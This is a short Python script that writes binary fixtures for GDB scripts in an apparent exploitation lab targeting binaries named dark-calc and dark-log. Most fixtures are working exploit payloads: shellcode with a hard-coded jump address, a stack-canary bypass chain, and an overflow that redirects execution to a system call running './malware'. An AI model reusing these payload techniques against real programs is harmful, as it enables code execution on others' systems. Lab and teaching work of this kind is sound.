#!/usr/bin/env python3
"""Write the stdin fixtures used by the GDB evidence scripts into /tmp/lab3-inputs."""
import os
import struct

OUT = "/tmp/lab3-inputs"
os.makedirs(OUT, exist_ok=True)
P64 = lambda x: struct.pack("<Q", x)


def w(name, data):
    with open(os.path.join(OUT, name), "wb") as fh:
        fh.write(data)


w("eight.bin", b"ABCDEFGH\n")
w("arith.bin", b"1+1\n")
w("empty.bin", b"\n")

# dark-calc fixed-stack shellcode payload (same bytes payload_dark.py emits)
sc = b"\x6a\x04\x5f" + b"\x48\xb8" + P64(0x401A87) + b"\xff\xe0"
w("shellcode.bin", sc.ljust(24, b"C") + P64(0x721000800FD0) + P64(0x4019B9) + b"\n")

# dark-log canary payload (same bytes payload_canary.py emits)
canary = (b"K" * 8 + P64(0x4018A3) + P64(4) + P64(0x401677)).ljust(256, b"L") + struct.pack("<I", 0xA0)
w("canary.bin", canary + b"\n")

# dark-calc overflow->eval-system payload (same bytes payload.py emits)
w("overflow_system.bin",
  b"./malware\x00" + b"A" * 6 + b"B" * 8 + P64(0x401A6B) + b"\n")

# dark-log stack-smash control: a valid len keeps the memcpy in-frame, but the
# canary bytes themselves are overwritten, so the return check must abort.
w("smash.bin", b"A" * 256 + struct.pack("<I", 0xA0) + b"B" * 20 + b"C" * 8 + b"\n")

print("wrote fixtures to", OUT)
